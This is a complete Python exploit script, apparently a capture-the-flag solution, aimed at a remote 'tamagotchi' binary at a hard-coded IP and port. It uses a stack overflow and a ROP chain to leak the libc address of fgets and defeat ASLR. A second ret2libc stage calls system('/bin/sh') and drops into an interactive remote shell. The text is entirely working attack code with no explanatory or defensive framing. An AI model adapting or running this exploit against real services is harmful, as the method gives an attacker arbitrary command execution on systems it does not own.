from pwn import *
from struct import *

IP = "80.74.140.188"
PORT = 31337

#e = ELF("/lib/x86_64-linux-gnu/libc.so.6", False)
e = ELF("libc-2.26.so", False)
fgets_offset = e.symbols['fgets']
system_offset = e.symbols['system']
binsh_offset = next(e.search("/bin/sh"))

e = ELF("tamagotchi", False)
r = ROP(e)
gadget_addr = r.find_gadget(["pop rdi", "ret"])[0]
fgets_got_addr = e.got['fgets']
puts_plt_addr = e.plt['puts']
main_addr = e.symbols['main']

#Exploit stage 1: ASLR Bypass
rop = p64(gadget_addr) 		# pop rdi; ret
rop += p64(fgets_got_addr) 	# fgets() @ GOT
rop += p64(puts_plt_addr) 	# puts() @ PLT
rop += p64(main_addr) 		# main()
payload = "\2" * 216 + rop + "\n2"

#r = process("./tamagotchi")
r = remote(IP, PORT)

print "\n\nStage 1: LEAK"
r.recvuntil("[ch01c3]>")
r.sendline("1")
r.recvuntil("[f00d]>")
r.sendline(payload)
r.recvuntil("[+] bye bye")
data = r.recvuntil("TAMAGOTCHI")[1:7]

fgets_addr = u64(data+"\x00"*2)
#Quick maths!
libc_base = fgets_addr - fgets_offset
system_address = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
print "DONE! (libc base addr: " + hex(libc_base) + ")"


#Exploit stage 2: ret2libc
rop = p64(gadget_addr) 		# pop rdi; ret
rop += p64(binsh_addr) 		# "/bin/sh"
rop += p64(system_address)	# system()
payload = "\2" * 216 + rop + "\n2"

print "\n\nStage 2: H4X"
r.sendline("1")
r.recvuntil("[f00d]>")
r.sendline(payload)
r.recvuntil("[+] bye bye")
print "DONE!"


print "\n\nStage 3: ???\nDONE!"

print "\n\nStage 4: PROFIT"
r.interactive()
